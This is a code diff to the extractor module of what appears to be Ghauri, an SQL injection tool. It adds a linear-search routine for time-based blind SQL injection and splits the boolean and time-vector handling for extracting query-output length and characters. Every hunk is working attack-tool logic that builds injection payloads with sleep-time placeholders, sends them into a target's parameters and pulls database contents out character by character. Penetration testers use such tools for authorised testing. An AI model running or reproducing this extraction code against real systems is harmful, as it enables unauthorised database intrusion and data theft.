@@ -146,12 +146,15 @@ class GhauriExtractor:
         queryable=None,
         chars="",
     ):
-        minimum = minimum
-        maximum = maximum
+        # need to implement retry mechanism in case of http connection related errors..
+        if not minimum:
+            minimum = 32
+        if not maximum:
+            maximum = 127
         ascii_char = 0
         is_found = False
         character = ""
-        logger.debug("performing a binary_search, for character..")
+        # logger.debug("performing a binary_search, for character..")
         logger.progress(f"retrieved: {chars}")
         while not is_found:
             sleep_time = timesec
@@ -186,7 +189,7 @@ class GhauriExtractor:
             except KeyboardInterrupt as error:
                 raise error
             response_time = attack.response_time
-            if attack01:
+            if attack01 and vector_type == "boolean_vector":
                 result, case, _ = check_boolean_responses(
                     base,
                     attack,
@@ -202,13 +205,74 @@ class GhauriExtractor:
                 else:
                     minimum = minimum
                     maximum = ascii_char
-            else:
+            if vector_type == "time_vector":
                 if response_time >= sleep_time:
                     minimum = ascii_char + 1
                     maximum = maximum
                 else:
                     minimum = minimum
                     maximum = ascii_char
+        return character
+
+    def _linear_search(
+        self,
+        url,
+        data,
+        vector,
+        parameter,
+        headers,
+        injection_type,
+        proxy=None,
+        is_multipart=False,
+        timeout=30,
+        delay=0,
+        timesec=5,
+        suppress_output=False,
+        expression_payload=None,
+        queryable=None,
+        chars="",
+        offset=0,
+        list_of_chars=None,
+    ):
+        # need to implement retry mechanism in case of http connection related errors..
+        character = ""
+        start = 0
+        end = len(list_of_chars)
+        while start < end:
+            ascii_char = list_of_chars[start]
+            start += 1
+            if delay > 0:
+                time.sleep(delay)
+            sleep_time = timesec
+            logger.progress(f"retrieved: {chars}{ascii_char}")
+            condition = expression_payload.format(
+                query=queryable, position=offset, char=ord(ascii_char)
+            )
+            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
+                "[SLEEPTIME]", f"{sleep_time}"
+            )
+            logger.payload(f"{expression}")
+            try:
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timesec=timesec,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=expression,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
+                )
+            except KeyboardInterrupt as error:
+                raise error
+            response_time = attack.response_time
+            if response_time >= sleep_time:
+                character += str(ascii_char)
+                # logger.debug(f"retrieved character: '{str(character)}'")
+                break
         return character
 
     def fetch_noc(
@@ -233,6 +297,7 @@ class GhauriExtractor:
         not_match_string=None,
         suppress_output=False,
         text_only=False,
+        vector_type=None,
     ):
 
         noc = 0
@@ -241,7 +306,6 @@ class GhauriExtractor:
         chars_extraction_payloads = NUMBER_OF_CHARACTERS_PAYLOADS.get(backend)
         if isinstance(chars_extraction_payloads, str):
             chars_extraction_payloads = [chars_extraction_payloads]
-
         for value in chars_extraction_payloads:
             is_noc_payload_found = False
             for entry in payloads:
@@ -251,9 +315,9 @@ class GhauriExtractor:
                         time.sleep(delay)
                     sleep_time = timesec
                     condition = value.format(query=entry, char=i)
-                    expression = vector.replace("[INFERENCE]", f"{condition}")
-                    if not attack01:
-                        expression = expression.replace("[SLEEPTIME]", f"{sleep_time}")
+                    expression = vector.replace("[INFERENCE]", f"{condition}").replace(
+                        "[SLEEPTIME]", f"{sleep_time}"
+                    )
                     logger.payload(f"{expression}")
                     try:
                         attack = inject_expression(
@@ -275,7 +339,7 @@ class GhauriExtractor:
                         )
                         logger.end("ending")
                         exit(0)
-                    if attack01:
+                    if attack01 and vector_type == "boolean_vector":
                         result, case, _ = check_boolean_responses(
                             base,
                             attack,
@@ -293,7 +357,7 @@ class GhauriExtractor:
                             noc = i
                             is_noc_found = True
                             break
-                    else:
+                    if vector_type == "time_vector":
                         response_time = attack.response_time
                         if response_time >= sleep_time:
                             working_query = entry
@@ -333,6 +397,7 @@ class GhauriExtractor:
         suppress_output=False,
         query_check=False,
         text_only=False,
+        vector_type=None,
     ):
 
         noc, _ = self.fetch_noc(
@@ -356,6 +421,7 @@ class GhauriExtractor:
             not_match_string=not_match_string,
             suppress_output=suppress_output,
             text_only=text_only,
+            vector_type=vector_type,
         )
         if query_check and noc > 0:
             return _
@@ -373,8 +439,7 @@ class GhauriExtractor:
             for entry in payloads:
                 chars = ""
                 for pos in range(1, noc + 1):
-                    if attack01:
-                        # extract characters using binary search algorithm
+                    if attack01 and vector_type == "boolean_vector":
                         try:
                             retval = self._binary_search(
                                 url=url,
@@ -411,59 +476,35 @@ class GhauriExtractor:
                             )
                             logger.end("ending")
                             exit(0)
-                    else:
-                        for i in [49, 48, 50, 51, 52, 53, 54, 55, 56, 57]:
-                            if delay > 0:
-                                time.sleep(delay)
-                            sleep_time = timesec
-                            logger.progress(f"retrieved: {chars}{chr(i)}")
-                            condition = value.format(query=entry, position=pos, char=i)
-                            expression = vector.replace("[INFERENCE]", f"{condition}")
-                            if not attack01:
-                                expression = expression.replace(
-                                    "[SLEEPTIME]", f"{sleep_time}"
-                                )
-                            logger.payload(f"{expression}")
-                            try:
-                                attack = inject_expression(
-                                    url=url,
-                                    data=data,
-                                    proxy=proxy,
-                                    delay=delay,
-                                    timesec=timesec,
-                                    timeout=timeout,
-                                    headers=headers,
-                                    parameter=parameter,
-                                    expression=expression,
-                                    is_multipart=is_multipart,
-                                    injection_type=injection_type,
-                                )
-                            except KeyboardInterrupt:
-                                logger.error(
-                                    "user interrupted during length of query output retrieval.."
-                                )
-                                logger.end("ending")
-                                exit(0)
-                            if attack01:
-                                result, case, _ = check_boolean_responses(
-                                    base,
-                                    attack,
-                                    attack01,
-                                    code=code,
-                                    match_string=match_string,
-                                    not_match_string=not_match_string,
-                                    text_only=text_only,
-                                )
-                                if result:
-                                    chars += str(chr(i))
-                                    logger.debug(f"character: '{str(chars)}'")
-                                    break
-                            else:
-                                response_time = attack.response_time
-                                if response_time >= sleep_time:
-                                    chars += str(chr(i))
-                                    logger.debug(f"retrieved length: '{str(chars)}'")
-                                    break
+                    if vector_type == "time_vector":
+                        try:
+                            retval = self._linear_search(
+                                url=url,
+                                data=data,
+                                vector=vector,
+                                parameter=parameter,
+                                headers=headers,
+                                injection_type=injection_type,
+                                proxy=proxy,
+                                is_multipart=is_multipart,
+                                timeout=timeout,
+                                delay=delay,
+                                timesec=timesec,
+                                suppress_output=suppress_output,
+                                expression_payload=value,
+                                queryable=entry,
+                                chars=chars,
+                                offset=pos,
+                                list_of_chars="1203456789",
+                            )
+                            chars += retval
+                            logger.debug(f"character found: '{str(chars)}'")
+                        except KeyboardInterrupt:
+                            logger.error(
+                                "user interrupted during length of query output retrieval.."
+                            )
+                            logger.end("ending")
+                            exit(0)
                 if len(chars) == noc:
                     if not suppress_output:
                         logger.info(f"retrieved: {chars}")
@@ -621,20 +662,10 @@ class GhauriExtractor:
                 payload=retval_error.payload,
             )
             return _temp_error
-        # if (
-        #     error_based_in_vectors
-        #     and not retval_error.ok
-        #     and backend == "Microsoft SQL Server"
-        # ):
-        #     _temp_error = PayloadResponse(
-        #         ok=retval_error.ok,
-        #         error=retval_error.error,
-        #         result=retval_error.result,
-        #         payload=retval_error.payload,
-        #     )
-        #     return _temp_error
-        if not retval_error.ok:
-            logger.debug("Switching to other injection types if any..")
+        if not retval_error.ok and error_based_in_vectors:
+            logger.debug(
+                "ghauri is going to use other injected vectors payloads if any."
+            )
         if not list_of_chars:
             list_of_chars = "._-1234567890aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ@+!#$%^&*()+"
         data_extraction_payloads = DATA_EXTRACTION_PAYLOADS.get(backend)
@@ -644,9 +675,9 @@ class GhauriExtractor:
         attack_data = data
         attack_headers = headers
         for vector_type, vector in self.vectors.items():
-            if vector_type == "error_vector":
+            if vector_type in ["error_vector", "boolean_vector"]:
                 continue
-            logger.debug(f"Ghauri is testing the with vector type: '{vector_type}'..")
+            logger.debug(f"testing now with vector '{vector}'")
             length = self.fetch_length(
                 url,
                 data,
@@ -669,12 +700,13 @@ class GhauriExtractor:
                 query_check=query_check,
                 suppress_output=suppress_output,
                 text_only=text_only,
+                vector_type=vector_type,
             )
             if length == 0:
                 logger.debug(
                     "it was not possible to extract query output length for the SQL query provided."
                 )
-                return _temp
+                continue
             if query_check:
                 return PayloadResponse(ok=True, error="", result="", payload=length)
             is_done_with_vector = False
@@ -716,7 +748,7 @@ class GhauriExtractor:
                                         text_only=text_only,
                                     )
                                     chars += retval
-                                    logger.debug(f"character found: '{str(chars)}'")
+                                    logger.debug(f"character(s) found: '{str(chars)}'")
                                 except KeyboardInterrupt:
                                     if chars:
                                         logger.info(f"retrieved: {chars}")
@@ -725,64 +757,76 @@ class GhauriExtractor:
                                     )
                                     logger.end("ending")
                                     exit(0)
-                            else:
-                                for i in list_of_chars:
-                                    sleep_time = timesec
-                                    if delay > 0:
-                                        time.sleep(delay)
-                                    logger.progress(f"retrieved: {chars}{i}")
-                                    condition = value.format(
-                                        query=entry, position=pos, char=ord(i)
+                            if vector_type == "time_vector":
+                                try:
+                                    retval = self._linear_search(
+                                        url=url,
+                                        data=data,
+                                        vector=vector,
+                                        parameter=parameter,
+                                        headers=headers,
+                                        injection_type=injection_type,
+                                        proxy=proxy,
+                                        is_multipart=is_multipart,
+                                        timeout=timeout,
+                                        delay=delay,
+                                        timesec=timesec,
+                                        suppress_output=suppress_output,
+                                        expression_payload=value,
+                                        queryable=entry,
+                                        chars=chars,
+                                        offset=pos,
+                                        list_of_chars=list_of_chars,
                                     )
-                                    expression = vector.replace(
-                                        "[INFERENCE]", f"{condition}"
+                                    chars += retval
+                                    logger.debug(f"character(s) found: '{str(chars)}'")
+                                except KeyboardInterrupt:
+                                    if chars:
+                                        logger.info(f"retrieved: {chars}")
+                                    logger.error(
+                                        "user aborted during query output retrieval.."
                                     )
-                                    if not attack01:
-                                        expression = expression.replace(
-                                            "[SLEEPTIME]", f"{sleep_time}"
-                                        )
-                                    logger.payload(f"{expression}")
-                                    try:
-                                        attack = inject_expression(
-                                            url=url,
-                                            data=data,
-                                            proxy=proxy,
-                                            delay=delay,
-                                            timesec=timesec,
-                                            timeout=timeout,
-                                            headers=headers,
-                                            parameter=parameter,
-                                            expression=expression,
-                                            is_multipart=is_multipart,
-                                            injection_type=injection_type,
-                                        )
-                                    except KeyboardInterrupt as e:
-                                        if chars:
-                                            logger.info(f"retrieved: {chars}")
-                                        logger.error(
-                                            "user interrupted during query output retrieval.."
-                                        )
-                                        logger.end("ending")
-                                        exit(0)
-                                    if attack01:
-                                        result, case, _ = check_boolean_responses(
-                                            base,
-                                            attack,
-                                            attack01,
-                                            match_string=match_string,
-                                        )
-                                        if result:
-                                            chars += i
-                                            logger.debug(
-                                                f"character found: '{str(chars)}'"
-                                            )
-                                            break
-                                    else:
-                                        response_time = attack.response_time
-                                        if response_time >= sleep_time:
-                                            chars += i
-                                            logger.debug(f"retrieved: '{str(chars)}'")
-                                            break
+                                    logger.end("ending")
+                                    exit(0)
+                                # for i in list_of_chars:
+                                #     sleep_time = timesec
+                                #     if delay > 0:
+                                #         time.sleep(delay)
+                                #     logger.progress(f"retrieved: {chars}{i}")
+                                #     condition = value.format(
+                                #         query=entry, position=pos, char=ord(i)
+                                #     )
+                                #     expression = vector.replace(
+                                #         "[INFERENCE]", f"{condition}"
+                                #     ).replace("[SLEEPTIME]", f"{sleep_time}")
+                                #     logger.payload(f"{expression}")
+                                #     try:
+                                #         attack = inject_expression(
+                                #             url=url,
+                                #             data=data,
+                                #             proxy=proxy,
+                                #             delay=delay,
+                                #             timesec=timesec,
+                                #             timeout=timeout,
+                                #             headers=headers,
+                                #             parameter=parameter,
+                                #             expression=expression,
+                                #             is_multipart=is_multipart,
+                                #             injection_type=injection_type,
+                                #         )
+                                #     except KeyboardInterrupt as e:
+                                #         if chars:
+                                #             logger.info(f"retrieved: {chars}")
+                                #         logger.error(
+                                #             "user interrupted during query output retrieval.."
+                                #         )
+                                #         logger.end("ending")
+                                #         exit(0)
+                                #     response_time = attack.response_time
+                                #     if response_time >= sleep_time:
+                                #         chars += i
+                                #         logger.debug(f"retrieved: '{str(chars)}'")
+                                #         break
                         if len(chars) == length:
                             is_char_found = True
                             _temp = PayloadResponse(
